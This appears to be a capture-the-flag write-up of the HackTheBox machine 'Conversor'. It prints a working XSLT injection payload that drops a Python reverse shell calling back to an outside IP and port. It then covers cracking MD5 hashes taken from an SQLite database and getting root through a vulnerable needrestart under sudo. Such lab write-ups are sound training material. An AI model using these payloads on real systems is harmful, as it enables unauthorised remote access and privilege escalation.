---
layout: post
title: Conversor
date: 2026-03-23 20:04 +0100
description: Exploiting an XSLT injection vulnerability to gain initial access, then escalating privileges through SQLite credential cracking and sudo abuse of needrestart.
categories:
- Challenges
- HackTheBox
- Linux
tags:
- hackthebox
- writeups
- linux
- easy
---

![Conversor HackTheBox Writeup](/assets/img/hackthebox/conversor/conversor.png){: width="80" height="80" .right }

## Reconnaissance

First, we use `nmap` to scan the target machine and identify open ports and running services. This helps us map the attack surface.

```bash
nmap -sS -sV -A -T4 <target_ip>
```

We find an HTTP server running on port 80. Open a browser and navigate to the target machine IP.

The first issue is that the website redirects to a domain named `conversor.htb`, so we need to add an entry in `/etc/hosts` to map this domain to the target IP.

```plaintext
<target_ip>    conversor.htb
```

Now we can access the website at `http://conversor.htb`.

## Uploading exploit (RCE)

The website accepts two files, one `.xml` and one `.xslt`, and processes them.
We can try uploading a malicious XSLT file to execute commands on the server.

I tried payloads from [XSLT Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/) and [XML External Entity (XXE) Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/), but none worked directly.

I also reviewed the available pages and found the application source code on `/about`.

The application is built with Flask and uses the `lxml` library to process XML/XSLT.
- XML parsing appears hardened: `parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False);xml_tree = etree.parse(xml_path, parser)`

- XSLT processing looks injectable: `transform = etree.XSLT(xslt_tree)`. No secure parser is defined here, so default behavior can allow risky features.

Inside `install.md`, we find this cron entry:
```plaintext

* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

This means every minute all Python scripts in `/var/www/conversor.htb/scripts/` are executed as `www-data`.

So we can upload a malicious XSLT file that writes a reverse shell script into `/var/www/conversor.htb/scripts/`.

Here is an example of a malicious XSLT file that will write a reverse shell script to the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/evi1.py" method="text">
import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.15.94",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

Change the IP address and port to your own values.
Save this file as `exploit.xslt` and upload it through the web application.
We also need to upload a valid XML file, for example:

```
<?xml version="1.0" encoding="UTF-8"?>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

Save this file as `note.xml` and upload it through the application.

Then start a Netcat listener on your machine to catch the reverse shell:

```bash
nc -lvnp 9001
```

After about a minute, we should receive a reverse shell.

Now we have access to the server as the `www-data` user.

## First privilege escalation

We need to escalate privileges to user `fismathack`. We can run `linpeas.sh` for enumeration, but at this stage nothing obvious appears.
However, reviewing the source code reveals an SQLite database without access controls, which lets us enumerate users.

```bash
sqlite3 /var/www/conversor.htb/instance/users.db
sqlite> SELECT * FROM users;
```

Inside, we find around 10 users and their MD5 password hashes.
We can use `hashcat` to crack them.

```bash
hashcat -m 0 hashes.txt rockyou.txt
```

We recover `Keepmesafeandwarm` as the password for `fismathack`.
Now we can connect over SSH as `fismathack`.

## Final privilege escalation

`linpeas.sh` also shows that `fismathack` can run `/usr/sbin/needrestart` with `sudo` and no password.

Next, check the installed `needrestart` version:

```bash
apt list --installed | grep "^\(needrestart\|libmodule-scandeps-perl\)"
```

The installed version is vulnerable to a local privilege escalation exploit:
[CVE-2024-48990](https://github.com/ns989/CVE-2024-48990).

Follow the PoC steps to obtain a root shell.
This creates a `_daemon` user with root privileges, allowing us to read the root flag.
